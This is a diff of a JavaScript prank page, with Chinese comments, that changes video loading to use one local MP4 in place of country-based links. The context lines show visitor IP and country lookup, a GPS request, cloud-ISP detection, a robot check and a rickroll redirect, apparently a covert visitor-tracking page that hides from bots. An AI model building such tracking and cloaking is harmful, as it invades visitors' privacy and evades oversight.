@@ -29,11 +29,11 @@ const jumpUrl = "http://full.rickroll.info/";
 const minecraftRedirect = "https://www.minecraft.net/es-es/";
 
 // ======================
-// ①国内MP4直链填这里
-const VIDEO_CN  = "video_260822_202145.mp4";
-
-// ②海外MP4直链填这里
-const VIDEO_OVERSEA = "video_260822_202145.mp4";
+// 视频固定使用仓库本地mp4，不分国内外
+const VIDEO_CN  = "在此粘贴国内mp4直链";
+const VIDEO_OVERSEA = "在此粘贴海外mp4直链";
+// 本地视频文件名（mp4放在github仓库根目录）
+const LOCAL_MP4 = "video_260822_202145.mp4";
 // ======================
 
 axios.defaults.timeout = 6000;
@@ -63,14 +63,9 @@ function isCloudISP(isp){
     return cloudProviders.some(name=> lowIsp.includes(name.toLowerCase()));
 }
 
-//新增：地区分流播放视频，不修改原有业务逻辑
+// 【修改】不再判断国家，全部直接加载本地视频
 function playBranchVideo(){
-    let targetVideoUrl;
-    if(ipData.country === "China"){
-        targetVideoUrl = VIDEO_CN;
-    }else{
-        targetVideoUrl = VIDEO_OVERSEA;
-    }
+    let targetVideoUrl = LOCAL_MP4;
     document.getElementById("videoSrc").src = targetVideoUrl;
     document.getElementById("mainVideo").load();
     document.getElementById("videoBox").style.display = "block";
@@ -170,7 +165,6 @@ if(isRobot){
         gpsTriggered = false;
         await getGPS();
 
-        //仅在此处新增调用视频播放，其余原有流程完全不动
         playBranchVideo();
 
         setTimeout(()=>{
